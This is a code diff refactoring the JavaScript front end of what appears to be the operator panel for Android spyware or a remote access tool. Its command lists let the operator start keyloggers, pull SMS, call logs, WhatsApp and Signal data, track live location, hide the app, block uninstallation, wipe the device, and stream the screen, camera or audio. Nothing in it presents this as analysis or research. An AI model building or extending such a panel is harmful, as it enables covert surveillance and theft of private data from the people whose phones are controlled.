+        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">CREATED</div><div>'+esc(d.created_at||'-')+'</div></div>'+
+      '</div>'+
+      '<h3 style="margin-bottom:12px">&#x1F4CB; Recent Commands</h3>'+
+      (cmds.length?cmds.map(function(c){return cmdItemHtml(c);}).join(''):'<div class="empty">No commands</div>')+
+      '<button class="btn btn-danger btn-sm" onclick="unlinkDevice(\''+esc(d.id)+'\')" style="margin-top:16px">&#x1F5D1;&#xFE0F; Unlink Device</button>';
+    detail.scrollIntoView({behavior:'smooth'});
+  }catch(e){}
 }
 
+/* ========== Unlink / Link ========== */
 async function unlinkDevice(id){
-if(!confirm('Unlink this device?'))return;
-const r=await api('web/unlink/'+id,{method:'DELETE'});
-if(r.ok){notify('Device unlinked');loadAll();}
-else notify('Failed','var(--accent)');
+  if(!confirm('Unlink this device?'))return;
+  var r=await api('web/unlink/'+id,{method:'DELETE'});
+  if(r.ok){notify('Device unlinked');loadAll();}
+  else notify('Failed','var(--red)');
 }
-
 async function generateLink(){
-const r=await api('web/link_code');
-if(r.ok){
-const box=document.getElementById('linkCodeBox');
-document.getElementById('linkCodeText').textContent=r.code;
-box.style.display='block';
-notify('Link code generated!');
-}
+  var r=await api('web/link_code');
+  if(r.ok){
+    var box=document.getElementById('linkCodeBox');
+    document.getElementById('linkCodeText').textContent=r.code;
+    box.style.display='block';
+    notify('Link code generated!');
+  }
 }
 
-const CMD_CATEGORIES={
-data:{label:'📊 Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
-social:{label:'🌐 Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
-control:{label:'🎮 Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
-apps:{label:'📦 Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
-files:{label:'📂 Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
-security:{label:'🔒 Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
-monitor:{label:'🔍 Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
-syssettings:{label:'⚙️ System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
+/* ========== Command Categories ========== */
+var CMD_CATEGORIES={
+  data:{label:'&#x1F4CA; Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
+  social:{label:'&#x1F310; Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
+  control:{label:'&#x1F3AE; Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
+  apps:{label:'&#x1F4E6; Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
+  files:{label:'&#x1F4C2; Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
+  security:{label:'&#x1F512; Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
+  monitor:{label:'&#x1F50D; Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
+  syssettings:{label:'&#x2699;&#xFE0F; System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
 };
 
 function initCmdTabs(){
-const tabs=document.getElementById('cmdTabs');
-tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(k=>`<button class="tab${k==='data'?' active':''}" onclick="showCmdCat('${k}',this)">${CMD_CATEGORIES[k].label}</button>`).join('');
-showCmdCat('data');
+  var tabs=document.getElementById('cmdTabs');
+  tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(function(k){return '<button class="tab'+(k==='data'?' active':'')+'" onclick="showCmdCat(\''+k+'\',this)">'+CMD_CATEGORIES[k].label+'</button>';}).join('');
+  showCmdCat('data');
 }
-
 function showCmdCat(cat,btn){
-if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');}
-const grid=document.getElementById('cmdGrid');
-grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(c=>`<button class="cmd-btn" onclick="sendDeviceCmd('${c}')">${c.replace(/_/g,' ')}</button>`).join('');
+  if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(function(t){t.classList.remove('active');});btn.classList.add('active');}
+  var grid=document.getElementById('cmdGrid');
+  grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(function(c){return '<button class="cmd-btn" onclick="sendDeviceCmd(\''+c+'\')">'+c.replace(/_/g,' ')+'</button>';}).join('');
 }
 
+/* ========== Send Commands ========== */
 async function sendDeviceCmd(cmd){
-const devId=document.getElementById('cmdDevice').value;
-if(!devId){notify('Select a device','var(--accent)');return;}
-const r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
-if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
-loadAll();
+  var devId=document.getElementById('cmdDevice').value;
+  if(!devId){notify('Select a device','var(--red)');return;}
+  var r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
+  if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  loadAll();
 }
-
 function sendCmd(cmd){
-const devId=document.getElementById('fileDevice').value;
-if(!devId){notify('Select a device','var(--accent)');return;}
-api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
-if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
-});
+  var devId=document.getElementById('fileDevice').value;
+  if(!devId){notify('Select a device','var(--red)');return;}
+  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
+    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  });
 }
 function sendDataCmd(cmd){
-const devId=document.getElementById('dataDevice').value;
-if(!devId){notify('Select a device','var(--accent)');return;}
-api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(r=>{
-if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
-});
+  var devId=document.getElementById('dataDevice').value;
+  if(!devId){notify('Select a device','var(--red)');return;}
+  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(function(r){
+    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  });
 }
 function sendMonCmd(cmd){
-const devId=document.getElementById('monDevice').value;
-if(!devId){notify('Select a device','var(--accent)');return;}
-api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
-if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
-});
+  var devId=document.getElementById('monDevice').value;
+  if(!devId){notify('Select a device','var(--red)');return;}
+  api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(function(r){
+    if(r.ok)notify('Command sent!');else notify('Failed','var(--red)');
+  });
 }
 
+/* ========== Command Log Rendering ========== */
+function cmdItemHtml(c){
+  var statusClass=c.status==='completed'?'green':c.status==='pending'?'yellow':c.status==='failed'?'red':'blue';
+  var statusLabel=c.status||'unknown';
+  var spinnerHtml=c.status==='pending'?' <span class="spinner"></span>':'';
+  var devName=c.device_id;
+  var dev=DEVICES.find(function(d){return d.id===c.device_id;});
+  if(dev)devName=dev.name||dev.id;
+  var resultId='cmdres_'+(c.id||'').replace(/[^a-zA-Z0-9]/g,'');
+  var hasResult=c.result&&(typeof c.result==='string'?c.result:JSON.stringify(c.result));
+  var toggleResult=hasResult?'<button class="btn btn-ghost btn-sm" onclick="toggleCmdResult(\''+resultId+'\')">&#x1F4CB; Toggle Result</button>'+
+    (hasResult?'<button class="btn btn-ghost btn-sm" onclick="copyCmdResult(\''+resultId+'\')">&#x1F4CB; Copy Result</button>':''):'';
+  return '<div class="cmd-item" data-id="'+esc(c.id)+'" data-status="'+esc(c.status)+'" data-device="'+esc(c.device_id)+'" data-command="'+esc(c.command)+'">'+
+    '<div class="cmd-header">'+
+      '<span class="cmd-cmd">'+esc(c.command)+spinnerHtml+'</span>'+
+      '<div style="display:flex;align-items:center;gap:6px">'+
+        toggleResult+
+        '<span class="badge badge-'+statusClass+'">'+esc(statusLabel)+'</span>'+
+      '</div>'+
+    '</div>'+
+    '<div class="cmd-meta">'+
+      '<span>&#x1F4F1; '+esc(devName)+'</span>'+
+      '<span>&#x1F552; '+esc(c.created_at||'-')+'</span>'+
+      (c.completed_at?'<span>&#x2705; '+esc(c.completed_at)+'</span>':'')+
+    '</div>'+
+    (hasResult?'<div class="cmd-result" id="'+resultId+'">'+esc(typeof c.result==='string'?c.result:JSON.stringify(c.result,null,2))+'</div>':'')+
+  '</div>';
+}
 function renderCommandLog(cmds){
-const el=document.getElementById('cmdLog');
-const dash=document.getElementById('dashCommands');
-const items=(cmds||[]).slice(-20).reverse();
-if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
-const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${esc(c.command)}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${esc(c.status)}</span></div><div style="color:var(--text2);font-size:12px">Device: ${esc(c.device_id)} | ${esc(c.created_at)}</div></div>`).join('');
-el.innerHTML=html;
-dash.innerHTML=html;
+  var filtered=filterCommandsList(cmds||[]);
+  var el=document.getElementById('cmdLog');
+  var dash=document.getElementById('dashCommands');
+  var items=filtered.slice(-30).reverse();
+  if(!items.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4CB;</div>No commands</div>';dash.innerHTML='';return;}
+  var html=items.map(cmdItemHtml).join('');
+  el.innerHTML=html;
+  dash.innerHTML=items.slice(0,8).map(cmdItemHtml).join('');
+}
+function filterCommandLog(){renderCommandLog(ALL_COMMANDS);}
+function filterCommandsList(cmds){
+  var statusF=document.getElementById('cmdStatusFilter').value;
+  var q=(document.getElementById('cmdSearchInput').value||'').toLowerCase();
+  return cmds.filter(function(c){
+    if(statusF!=='all'&&c.status!==statusF)return false;
+    if(q){
+      var text=(c.command+' '+c.device_id+' '+(c.result||'')).toLowerCase();
+      if(text.indexOf(q)<0)return false;
+    }
+    return true;
+  });
+}
+function toggleCmdResult(id){
+  var el=document.getElementById(id);
+  if(el)el.classList.toggle('expanded');
+}
+function copyCmdResult(id){
+  var el=document.getElementById(id);
+  if(!el)return;
+  navigator.clipboard.writeText(el.textContent).then(function(){notify('Copied to clipboard!');}).catch(function(){notify('Copy failed','var(--red)');});
+}
+function checkPendingRefresh(){
+  var hasPending=ALL_COMMANDS.some(function(c){return c.status==='pending';});
+  if(hasPending&&!PENDING_REFRESH){
+    PENDING_REFRESH=setInterval(function(){
+      var still=ALL_COMMANDS.some(function(c){return c.status==='pending';});
+      if(!still){clearInterval(PENDING_REFRESH);PENDING_REFRESH=null;return;}
+      api('web/commands').then(function(r){if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);}});
+    },3000);
+  }
 }
 
+/* ========== Event Log ========== */
 async function loadEvents(){
-const r=await api('web/events');
-if(r.ok){
-const el=document.getElementById('eventLog');
-el.innerHTML=(r.events||[]).slice(-50).reverse().map(e=>`<div class="log-item"><span class="time">${esc((e.time||'').slice(0,19))}</span><span class="event">${esc(e.event)} ${e.details?esc(JSON.stringify(e.details).slice(0,60)):''}</span></div>`).join('')||'<div class="empty">No events</div>';
+  var r=await api('web/events');
+  if(r.ok){
+    ALL_EVENTS=r.events||[];
+    renderEventLog(ALL_EVENTS);
+    populateEventDeviceFilter();
+  }
 }
+function eventLevelClass(level){
+  if(level==='security'||level==='error'||level==='danger')return 'security';
+  if(level==='warning')return 'warning';
+  if(level==='success')return 'success';
+  return 'info';
+}
+function renderEventLog(events){
+  var filtered=filterEventsList(events||[]);
+  var tbody=document.getElementById('eventLogBody');
+  var emptyEl=document.getElementById('eventLogEmpty');
+  if(!filtered.length){tbody.innerHTML='';emptyEl.style.display='';return;}
+  emptyEl.style.display='none';
+  tbody.innerHTML=filtered.reverse().map(function(e){
+    var level=e.level||'info';
+    var cls=eventLevelClass(level);
+    var devName=esc(e.details&&e.details.id?e.details.id:'-');
+    if(e.details&&e.details.name)devName=esc(e.details.name);
+    var detailsStr='';
+    if(e.details){
+      try{detailsStr=JSON.stringify(e.details).slice(0,120);}catch(ex){detailsStr=String(e.details).slice(0,120);}
+    }
+    return '<tr class="event-item">'+
+      '<td class="ev-time">'+esc((e.time||'').slice(0,19))+'</td>'+
+      '<td class="ev-device">'+devName+'</td>'+
+      '<td><span class="ev-type '+cls+'">'+esc(level)+'</span></td>'+
+      '<td>'+esc(e.event||'')+'</td>'+
+      '<td style="color:var(--text-muted);font-size:11px">'+esc(detailsStr)+'</td>'+
+    '</tr>';
+  }).join('');
+  if(document.getElementById('eventAutoScroll').checked){
+    var wrap=tbody.closest('.table-wrap');
+    if(wrap)wrap.scrollTop=wrap.scrollHeight;
+  }
+}
+function filterEventLog(){renderEventLog(ALL_EVENTS);}
+function filterEventsList(events){
+  var devF=document.getElementById('eventDeviceFilter').value;
+  var typeF=document.getElementById('eventTypeFilter').value;
+  var dateF=document.getElementById('eventDateFilter').value;
+  return events.filter(function(e){
+    if(devF!=='all'){
+      if(e.details&&e.details.id&&e.details.id!==devF)return false;
+      if(!e.details||!e.details.id)return false;
+    }
+    if(typeF!=='all'){
+      var cls=eventLevelClass(e.level||'info');
+      if(cls!==typeF)return false;
+    }
+    if(dateF&&(e.time||'').slice(0,10)!==dateF)return false;
+    return true;
+  });
 }
 
+/* ========== Settings ========== */
 async function loadSettings(){
-const r=await api('web/settings');
-if(r.ok){
-const s=r.settings;
-document.getElementById('settingsForm').innerHTML=`
-<label style="display:block;margin-bottom:12px">🔑 Admin Password<input id="setPass" value="${esc(s.admin_password||'admin')}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
-<label style="display:block;margin-bottom:12px">⏱️ Sync Interval (sec)<input id="setSync" type="number" value="${esc(s.sync_interval||300)}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
-<label style="display:block;margin-bottom:12px">📍 Location Interval (sec)<input id="setLoc" type="number" value="${esc(s.location_interval||60)}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
-<label style="display:block;margin-bottom:12px">🌐 Language<select id="setLang" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"><option value="ar" ${s.language==='ar'?'selected':''}>Arabic</option><option value="en" ${s.language==='en'?'selected':''}>English</option></select></label>
-<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" ${s.notifications?'checked':''}> 🔔 Notifications</label>
-<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" ${s.auto_location?'checked':''}> 🗺️ Auto Location</label>
-<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" ${s.auto_sync?'checked':''}> 🔄 Auto Sync</label>`;
+  var r=await api('web/settings');
+  if(r.ok){
+    var s=r.settings;
+    document.getElementById('settingsForm').innerHTML=
+      '<label style="display:block;margin-bottom:12px">&#x1F511; Admin Password<input id="setPass" value="'+esc(s.admin_password||'admin')+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+      '<label style="display:block;margin-bottom:12px">&#x23F1; Sync Interval (sec)<input id="setSync" type="number" value="'+esc(s.sync_interval||300)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+      '<label style="display:block;margin-bottom:12px">&#x1F4CD; Location Interval (sec)<input id="setLoc" type="number" value="'+esc(s.location_interval||60)+'" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"></label>'+
+      '<label style="display:block;margin-bottom:12px">&#x1F310; Language<select id="setLang" style="display:block;width:100%;padding:9px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px;outline:none"><option value="ar" '+(s.language==='ar'?'selected':'')+'>Arabic</option><option value="en" '+(s.language==='en'?'selected':'')+'>English</option></select></label>'+
+      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" '+(s.notifications?'checked':'')+'> &#x1F514; Notifications</label>'+
+      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" '+(s.auto_location?'checked':'')+'> &#x1F5FA;&#xFE0F; Auto Location</label>'+
+      '<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" '+(s.auto_sync?'checked':'')+'> &#x1F504; Auto Sync</label>';
+  }
 }
-}
-
 async function saveSettings(){
-const data={
-admin_password:document.getElementById('setPass').value,
-sync_interval:parseInt(document.getElementById('setSync').value),
-location_interval:parseInt(document.getElementById('setLoc').value),
-language:document.getElementById('setLang').value,
-notifications:document.getElementById('setNotif').checked,
-auto_location:document.getElementById('setAutoLoc').checked,
-auto_sync:document.getElementById('setAutoSync').checked,
-};
-const r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
-if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
+  var data={
+    admin_password:document.getElementById('setPass').value,
+    sync_interval:parseInt(document.getElementById('setSync').value),
+    location_interval:parseInt(document.getElementById('setLoc').value),
+    language:document.getElementById('setLang').value,
+    notifications:document.getElementById('setNotif').checked,
+    auto_location:document.getElementById('setAutoLoc').checked,
+    auto_sync:document.getElementById('setAutoSync').checked,
+  };
+  var r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
+  if(r.ok)notify('Settings saved!');else notify('Failed','var(--red)');
 }
 
+/* ========== Init ========== */
 if(TOKEN){showApp();}
 initCmdTabs();
 setTimeout(loadSettings,500);
 
-// ========== LIVE STREAMING (JPEG Screenshot-based) ==========
-let _streamType='screen';
-let _streamActive=false;
-let _streamPollTimer=null;
-let _frameCount=0;
-let _audioAnimFrame=null;
-let _streamWaitingTimer=null;
-let _firstFrameReceived=false;
-let _lastFrameData='';
-let _streamQuality=3;
-
-
+/* ========== LIVE STREAMING (JPEG Screenshot-based) ========== */
+var _streamType='screen';
+var _streamActive=false;
+var _streamPollTimer=null;
+var _frameCount=0;
+var _audioAnimFrame=null;
+var _streamWaitingTimer=null;
+var _firstFrameReceived=false;
+var _lastFrameData='';
+var _streamQuality=3;
 
 function onStreamDeviceChange(){
-const devId=document.getElementById('streamDevice').value;
-document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
-if(_streamActive)stopStream();
+  var devId=document.getElementById('streamDevice').value;
+  document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
+  if(_streamActive)stopStream();
 }
-
 function selectStreamType(type){
-_streamType=type;
-document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
-var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
-document.getElementById(btnId).classList.add('active');
-document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
+  _streamType=type;
+  document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
+  var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
+  document.getElementById(btnId).classList.add('active');
+  document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
 }
-
 function setQuality(q,btn){
-_streamQuality={'low':8,'medium':3,'high':1}[q]||3;
-document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
-btn.classList.add('active');
-notify('تم تغيير الجودة');
+  _streamQuality={'low':8,'medium':3,'high':1}[q]||3;
+  document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
+  btn.classList.add('active');
+  notify('Quality changed');
 }
-
 function _setViewerState(state){
-var viewer=document.getElementById('streamViewer');
-var noMsg=document.getElementById('noStreamMsg');
-var img=document.getElementById('streamImg');
-var badge=document.getElementById('streamBadge');
-var audioC=document.getElementById('audioPlayerContainer');
-noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
-if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>اختر جهازاً وابدأ البث المباشر';viewer.style.background='var(--surface)';}
-else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">جاري انتظار الصورة من الجهاز...</div><div style="color:var(--text2);font-size:13px">يتم إرسال أمر لقطة الشاشة للجهاز.<br>قد يستغرق الأمر بضع ثوانٍ للإطار الأول.<br>تأكد أن الجهاز متصل بالإنترنت وأن إذن التقاط الشاشة ممنوحة.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">● انتظار...</span>';}
-else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">● متصل - ينتظر إطار...</span>';}
-else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
-else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
-else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">لم يتم استلام البث</div><div style="color:var(--text2);font-size:13px">تأكد أن الجهاز متصل ويمكنه تنفيذ أمر لقطة الشاشة.<br>تأكد من منح إذن التقاط الشاشة في تطبيق الجهاز.<br>حاول مرة أخرى.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">● فشل</span>';}
+  var viewer=document.getElementById('streamViewer');
+  var noMsg=document.getElementById('noStreamMsg');
+  var img=document.getElementById('streamImg');
+  var badge=document.getElementById('streamBadge');
+  var audioC=document.getElementById('audioPlayerContainer');
+  noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
+  if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>Select a device and start streaming';viewer.style.background='var(--surface)';}
+  else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">Waiting for device frame...</div><div style="color:var(--text-secondary);font-size:13px">Sending screenshot command to device.<br>First frame may take a few seconds.<br>Ensure device is connected and screen capture permission is granted.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">&#x25CF; Waiting...</span>';}
+  else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">&#x25CF; Connected - waiting for frame...</span>';}
+  else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
+  else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">&#x25CF; Live</span>';}
+  else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">Stream failed</div><div style="color:var(--text-secondary);font-size:13px">Make sure the device is connected.<br>Ensure screen capture permission is granted.<br>Try again.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">&#x25CF; Failed</span>';}
 }
-
 async function startStream(){
-var devId=document.getElementById('streamDevice').value;
-if(!devId){notify('اختر جهازاً أولاً','var(--accent)');return;}
-_streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
-document.getElementById('btnStartStream').style.display='none';
-document.getElementById('btnStopStream').style.display='';
-document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
-document.getElementById('stFrames').textContent='0';
-document.getElementById('stLastAct').textContent='-';
-var typeLabel=_streamType==='screen'?'الشاشة':_streamType==='camera'?'الكاميرا':'الصوت';
-document.getElementById('stType').textContent=typeLabel;
-var dev=DEVICES.find(function(d){return d.id===devId;});
-document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
-_setViewerState('waiting');
-notify('جاري بدء البث: '+typeLabel);
-var interval=_streamType==='audio'?5:_streamQuality;
-var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
-if(!r.ok){notify('فشل بدء البث: '+(r.error||''),'var(--accent)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
-notify('تم بدء البث - بانتظار الإطار الأول...');
-startStreamPolling(devId);
-if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
-_streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
+  var devId=document.getElementById('streamDevice').value;
+  if(!devId){notify('Select a device first','var(--red)');return;}
+  _streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
+  document.getElementById('btnStartStream').style.display='none';
+  document.getElementById('btnStopStream').style.display='';
+  document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
+  document.getElementById('stFrames').textContent='0';
+  document.getElementById('stLastAct').textContent='-';
+  var typeLabel=_streamType==='screen'?'Screen':_streamType==='camera'?'Camera':'Audio';
+  document.getElementById('stType').textContent=typeLabel;
+  var dev=DEVICES.find(function(d){return d.id===devId;});
+  document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
+  _setViewerState('waiting');
+  notify('Starting stream: '+typeLabel);
+  var interval=_streamType==='audio'?5:_streamQuality;
+  var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
+  if(!r.ok){notify('Stream start failed: '+(r.error||''),'var(--red)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
+  notify('Stream started - waiting for first frame...');
